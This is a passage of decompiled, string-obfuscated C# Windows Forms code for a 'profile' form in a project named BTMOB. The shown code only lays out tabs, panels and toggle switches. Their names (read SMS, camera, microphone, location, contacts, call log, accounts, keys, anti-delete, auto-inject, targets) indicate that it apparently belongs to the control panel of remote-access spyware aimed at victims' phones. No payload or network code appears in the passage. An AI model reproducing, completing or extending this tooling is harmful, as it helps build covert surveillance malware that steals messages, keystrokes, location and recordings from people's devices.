			DrakeUIButtonIcon drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_clrbtn = value;
			drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel41")]
	internal virtual Panel Panel41
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim16")]
	internal virtual DrakeUISymbolLabel prim16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkwritstng
	{
		[CompilerGenerated]
		get
		{
			return _checkwritstng;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkwritstng_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkwritstng;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkwritstng = value;
			drakeUIOSSwitch = _checkwritstng;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel45")]
	internal virtual Panel Panel45
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim2")]
	internal virtual DrakeUISymbolLabel prim2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkaccfiles
	{
		[CompilerGenerated]
		get
		{
			return _checkaccfiles;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkaccfiles_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkaccfiles;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkaccfiles = value;
			drakeUIOSSwitch = _checkaccfiles;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel46")]
	internal virtual Panel Panel46
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn1")]
	internal virtual DrakeUISymbolLabel optn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch chkscrns
	{
		[CompilerGenerated]
		get
		{
			return _chkscrns;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = chkscrns_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _chkscrns;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_chkscrns = value;
			drakeUIOSSwitch = _chkscrns;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W13")]
	internal virtual DrakeWidth_W DrakeWidth_W13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W12")]
	internal virtual DrakeWidth_W DrakeWidth_W12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W14")]
	internal virtual DrakeWidth_W DrakeWidth_W14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W15")]
	internal virtual DrakeWidth_W DrakeWidth_W15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel47")]
	internal virtual Panel Panel47
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim18")]
	internal virtual DrakeUISymbolLabel prim18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checknotifys
	{
		[CompilerGenerated]
		get
		{
			return _checknotifys;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checknotifys_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checknotifys;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checknotifys = value;
			drakeUIOSSwitch = _checknotifys;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel48")]
	internal virtual Panel Panel48
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn8")]
	internal virtual DrakeUISymbolLabel optn8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch Checkatoject
	{
		[CompilerGenerated]
		get
		{
			return _Checkatoject;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = Checkatoject_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _Checkatoject;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_Checkatoject = value;
			drakeUIOSSwitch = _Checkatoject;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel49")]
	internal virtual Panel Panel49
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn9")]
	internal virtual DrakeUISymbolLabel optn9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkantdelete
	{
		[CompilerGenerated]
		get
		{
			return _checkantdelete;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkantdelete_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkantdelete;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkantdelete = value;
			drakeUIOSSwitch = _checkantdelete;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel50")]
	internal virtual Panel Panel50
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel1")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch Checkcryptmsg
	{
		[CompilerGenerated]
		get
		{
			return _Checkcryptmsg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = Checkcryptmsg_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _Checkcryptmsg;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_Checkcryptmsg = value;
			drakeUIOSSwitch = _Checkcryptmsg;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("infoview")]
	internal virtual WebView2 infoview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public profile()
	{
		base.Load += profile_Load;
		base.FormClosing += profile_FormClosing;
		holdrequests = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.profile));
		this.maintabctrl = new DrakeUI.Framework.DrakeUITabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.Panel47 = new System.Windows.Forms.Panel();
		this.prim18 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checknotifys = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel41 = new System.Windows.Forms.Panel();
		this.prim16 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkwritstng = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel27 = new System.Windows.Forms.Panel();
		this.prim15 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkreadsms = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel17 = new System.Windows.Forms.Panel();
		this.prim14 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkinstll = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel16 = new System.Windows.Forms.Panel();
		this.prim13 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkdraw = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel15 = new System.Windows.Forms.Panel();
		this.prim12 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkbtry = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel14 = new System.Windows.Forms.Panel();
		this.prim11 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkwallp = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel13 = new System.Windows.Forms.Panel();
		this.prim10 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkssms = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel12 = new System.Windows.Forms.Panel();
		this.prim9 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkcallph = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel11 = new System.Windows.Forms.Panel();
		this.prim8 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkloc = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel10 = new System.Windows.Forms.Panel();
		this.prim7 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkmic = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.prim6 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkaccounts = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel8 = new System.Windows.Forms.Panel();
		this.prim5 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkcalllog = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.prim4 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkcontact = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.prim3 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkcamera = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel45 = new System.Windows.Forms.Panel();
		this.prim2 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkaccfiles = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.prim1 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkaccess = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.Panel50 = new System.Windows.Forms.Panel();
		this.DrakeUISymbolLabel1 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.Checkcryptmsg = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel49 = new System.Windows.Forms.Panel();
		this.optn9 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkantdelete = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel48 = new System.Windows.Forms.Panel();
		this.optn8 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.Checkatoject = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel24 = new System.Windows.Forms.Panel();
		this.optn7 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.chkLivnotify = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel23 = new System.Windows.Forms.Panel();
		this.optn6 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkRvlinks = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel22 = new System.Windows.Forms.Panel();
		this.optn5 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.chkRvapps = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel21 = new System.Windows.Forms.Panel();
		this.optn4 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkRactv = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel20 = new System.Windows.Forms.Panel();
		this.optn3 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkRnotfy = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel18 = new System.Windows.Forms.Panel();
		this.optn2 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.checkkeys = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel46 = new System.Windows.Forms.Panel();
		this.optn1 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.chkscrns = new DrakeUI.Framework.DrakeUIOSSwitch();
		this.Panel19 = new System.Windows.Forms.Panel();
		this.TabPage4 = new System.Windows.Forms.TabPage();
		this.logactivitystext = new System.Windows.Forms.RichTextBox();
		this.clrbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel25 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W15 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.delbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W14 = new DrakeUI.Framework.DrakeWidth_W();
		this.srchbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W12 = new DrakeUI.Framework.DrakeWidth_W();
		this.Combodats = new DrakeUI.Framework.DrakeUIComboBox();
		this.DrakeWidth_W13 = new DrakeUI.Framework.DrakeWidth_W();
		this.comboTargts = new DrakeUI.Framework.DrakeUIComboBox();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.Panel26 = new System.Windows.Forms.Panel();
		this.mainstatelabel = new System.Windows.Forms.Label();
		this.loadworker = new System.ComponentModel.BackgroundWorker();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.infoview = new Microsoft.Web.WebView2.WinForms.WebView2();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.maintabctrl.SuspendLayout();
		this.TabPage1.SuspendLayout();
		this.TabPage2.SuspendLayout();
		this.Panel47.SuspendLayout();
		this.Panel41.SuspendLayout();
		this.Panel27.SuspendLayout();
		this.Panel17.SuspendLayout();
		this.Panel16.SuspendLayout();
		this.Panel15.SuspendLayout();
		this.Panel14.SuspendLayout();
		this.Panel13.SuspendLayout();
		this.Panel12.SuspendLayout();
		this.Panel11.SuspendLayout();
		this.Panel10.SuspendLayout();
		this.Panel9.SuspendLayout();
		this.Panel8.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel45.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.TabPage3.SuspendLayout();
		this.Panel50.SuspendLayout();
		this.Panel49.SuspendLayout();
		this.Panel48.SuspendLayout();
		this.Panel24.SuspendLayout();
		this.Panel23.SuspendLayout();
		this.Panel22.SuspendLayout();
		this.Panel21.SuspendLayout();
		this.Panel20.SuspendLayout();
		this.Panel18.SuspendLayout();
		this.Panel46.SuspendLayout();
		this.TabPage4.SuspendLayout();
		this.Panel25.SuspendLayout();
		this.Panel26.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.infoview).BeginInit();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(734, 5);
		this.minibtn.Location = new System.Drawing.Point(776, 5);
		this.closbtn.Location = new System.Drawing.Point(818, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(850, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(860, 26);
		this.maintabctrl.Controls.Add(this.TabPage1);
		this.maintabctrl.Controls.Add(this.TabPage2);
		this.maintabctrl.Controls.Add(this.TabPage3);
		this.maintabctrl.Controls.Add(this.TabPage4);
		this.maintabctrl.Dock = System.Windows.Forms.DockStyle.Fill;
		this.maintabctrl.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.maintabctrl.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.maintabctrl.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.maintabctrl.ItemSize = new System.Drawing.Size(150, 40);
		this.maintabctrl.Location = new System.Drawing.Point(2, 64);
		this.maintabctrl.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.maintabctrl.Name = EXGuarder._58561A0E;
		this.maintabctrl.SelectedIndex = 0;
		this.maintabctrl.Size = new System.Drawing.Size(860, 714);
		this.maintabctrl.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.maintabctrl.Style = DrakeUI.Framework.UIStyle.Custom;
		this.maintabctrl.TabBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.maintabctrl.TabIndex = 39;
		this.maintabctrl.TabSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.maintabctrl.TabSelectedForeColor = System.Drawing.Color.White;
		this.maintabctrl.TabSelectedHighColor = System.Drawing.Color.Silver;
		this.maintabctrl.TabUnSelectedForeColor = System.Drawing.Color.Gray;
		this.TabPage1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage1.Controls.Add(this.infoview);
		this.TabPage1.Location = new System.Drawing.Point(0, 40);
		this.TabPage1.Name = EXGuarder._2B2F0407;
		this.TabPage1.Size = new System.Drawing.Size(860, 674);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = EXGuarder._5719181A;
		this.TabPage2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage2.Controls.Add(this.Panel47);
		this.TabPage2.Controls.Add(this.Panel41);
		this.TabPage2.Controls.Add(this.Panel27);
		this.TabPage2.Controls.Add(this.Panel17);
		this.TabPage2.Controls.Add(this.Panel16);
		this.TabPage2.Controls.Add(this.Panel15);
		this.TabPage2.Controls.Add(this.Panel14);
		this.TabPage2.Controls.Add(this.Panel13);
		this.TabPage2.Controls.Add(this.Panel12);
		this.TabPage2.Controls.Add(this.Panel11);
		this.TabPage2.Controls.Add(this.Panel10);
		this.TabPage2.Controls.Add(this.Panel9);
		this.TabPage2.Controls.Add(this.Panel8);
		this.TabPage2.Controls.Add(this.Panel7);
		this.TabPage2.Controls.Add(this.Panel6);
		this.TabPage2.Controls.Add(this.Panel45);
		this.TabPage2.Controls.Add(this.Panel4);
		this.TabPage2.Controls.Add(this.Panel5);
		this.TabPage2.Location = new System.Drawing.Point(0, 40);
		this.TabPage2.Name = EXGuarder._2B4C513D;
		this.TabPage2.Size = new System.Drawing.Size(860, 674);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = EXGuarder._07033C3D;
		this.Panel47.Controls.Add(this.prim18);
		this.Panel47.Controls.Add(this.checknotifys);
		this.Panel47.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel47.Location = new System.Drawing.Point(0, 517);
		this.Panel47.Name = EXGuarder._5E36000B;
		this.Panel47.Padding = new System.Windows.Forms.Padding(7);
		this.Panel47.Size = new System.Drawing.Size(860, 31);
		this.Panel47.TabIndex = 19;
		this.prim18.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim18.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim18.ForeColor = System.Drawing.Color.White;
		this.prim18.Location = new System.Drawing.Point(53, 7);
		this.prim18.Name = EXGuarder._32734667;
		this.prim18.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim18.Size = new System.Drawing.Size(800, 17);
		this.prim18.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim18.Symbol = 57444;
		this.prim18.SymbolColor = System.Drawing.Color.White;
		this.prim18.SymbolSize = 21;
		this.prim18.TabIndex = 17;
		this.prim18.Text = EXGuarder._2B273054;
		this.prim18.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checknotifys.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checknotifys.ActiveText = EXGuarder._08631C18;
		this.checknotifys.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checknotifys.Dock = System.Windows.Forms.DockStyle.Left;
		this.checknotifys.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checknotifys.InActiveText = EXGuarder._08631C18;
		this.checknotifys.Location = new System.Drawing.Point(7, 7);
		this.checknotifys.Name = EXGuarder._4F08500D;
		this.checknotifys.Padding = new System.Windows.Forms.Padding(4);
		this.checknotifys.Size = new System.Drawing.Size(46, 17);
		this.checknotifys.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checknotifys.TabIndex = 16;
		this.checknotifys.Text = EXGuarder._40532942;
		this.Panel41.Controls.Add(this.prim16);
		this.Panel41.Controls.Add(this.checkwritstng);
		this.Panel41.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel41.Enabled = false;
		this.Panel41.Location = new System.Drawing.Point(0, 486);
		this.Panel41.Name = EXGuarder._5F772976;
		this.Panel41.Padding = new System.Windows.Forms.Padding(7);
		this.Panel41.Size = new System.Drawing.Size(860, 31);
		this.Panel41.TabIndex = 17;
		this.Panel41.Visible = false;
		this.prim16.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim16.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim16.ForeColor = System.Drawing.Color.White;
		this.prim16.Location = new System.Drawing.Point(53, 7);
		this.prim16.Name = EXGuarder._225D2B03;
		this.prim16.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim16.Size = new System.Drawing.Size(800, 17);
		this.prim16.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim16.Symbol = 61459;
		this.prim16.SymbolColor = System.Drawing.Color.White;
		this.prim16.SymbolSize = 21;
		this.prim16.TabIndex = 17;
		this.prim16.Text = EXGuarder._605B246B;
		this.prim16.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkwritstng.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkwritstng.ActiveText = EXGuarder._08631C18;
		this.checkwritstng.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkwritstng.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkwritstng.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkwritstng.InActiveText = EXGuarder._08631C18;
		this.checkwritstng.Location = new System.Drawing.Point(7, 7);
		this.checkwritstng.Name = EXGuarder._666C6A57;
		this.checkwritstng.Padding = new System.Windows.Forms.Padding(4);
		this.checkwritstng.Size = new System.Drawing.Size(46, 17);
		this.checkwritstng.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkwritstng.TabIndex = 16;
		this.checkwritstng.Text = EXGuarder._40532942;
		this.Panel27.Controls.Add(this.prim15);
		this.Panel27.Controls.Add(this.checkreadsms);
		this.Panel27.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel27.Location = new System.Drawing.Point(0, 455);
		this.Panel27.Name = EXGuarder._3C30210D;
		this.Panel27.Padding = new System.Windows.Forms.Padding(7);
		this.Panel27.Size = new System.Drawing.Size(860, 31);
		this.Panel27.TabIndex = 16;
		this.prim15.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim15.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim15.ForeColor = System.Drawing.Color.White;
		this.prim15.Location = new System.Drawing.Point(53, 7);
		this.prim15.Name = EXGuarder._5B450A5F;
		this.prim15.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim15.Size = new System.Drawing.Size(800, 17);
		this.prim15.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim15.Symbol = 57446;
		this.prim15.SymbolColor = System.Drawing.Color.White;
		this.prim15.SymbolSize = 21;
		this.prim15.TabIndex = 17;
		this.prim15.Text = EXGuarder._11490C00;
		this.prim15.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkreadsms.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkreadsms.ActiveText = EXGuarder._08631C18;
		this.checkreadsms.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkreadsms.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkreadsms.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkreadsms.InActiveText = EXGuarder._08631C18;
		this.checkreadsms.Location = new System.Drawing.Point(7, 7);
		this.checkreadsms.Name = EXGuarder._33527320;
		this.checkreadsms.Padding = new System.Windows.Forms.Padding(4);
		this.checkreadsms.Size = new System.Drawing.Size(46, 17);
		this.checkreadsms.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkreadsms.TabIndex = 16;
		this.checkreadsms.Text = EXGuarder._40532942;
		this.Panel17.Controls.Add(this.prim14);
		this.Panel17.Controls.Add(this.checkinstll);
		this.Panel17.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel17.Enabled = false;
		this.Panel17.Location = new System.Drawing.Point(0, 424);
		this.Panel17.Name = EXGuarder._083D1D56;
		this.Panel17.Padding = new System.Windows.Forms.Padding(7);
		this.Panel17.Size = new System.Drawing.Size(860, 31);
		this.Panel17.TabIndex = 15;
		this.Panel17.Visible = false;
		this.prim14.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim14.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim14.ForeColor = System.Drawing.Color.White;
		this.prim14.Location = new System.Drawing.Point(53, 7);
		this.prim14.Name = EXGuarder._6D55774B;
		this.prim14.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim14.Size = new System.Drawing.Size(800, 17);
		this.prim14.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim14.Symbol = 61819;
		this.prim14.SymbolColor = System.Drawing.Color.White;
		this.prim14.SymbolSize = 21;
		this.prim14.TabIndex = 17;
		this.prim14.Text = EXGuarder._453D0178;
		this.prim14.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkinstll.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkinstll.ActiveText = EXGuarder._08631C18;
		this.checkinstll.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkinstll.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkinstll.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkinstll.InActiveText = EXGuarder._08631C18;
		this.checkinstll.Location = new System.Drawing.Point(7, 7);
		this.checkinstll.Name = EXGuarder._693D5A1F;
		this.checkinstll.Padding = new System.Windows.Forms.Padding(4);
		this.checkinstll.Size = new System.Drawing.Size(46, 17);
		this.checkinstll.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkinstll.TabIndex = 16;
		this.checkinstll.Text = EXGuarder._7033373D;
		this.Panel16.Controls.Add(this.prim13);
		this.Panel16.Controls.Add(this.checkdraw);
		this.Panel16.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel16.Location = new System.Drawing.Point(0, 393);
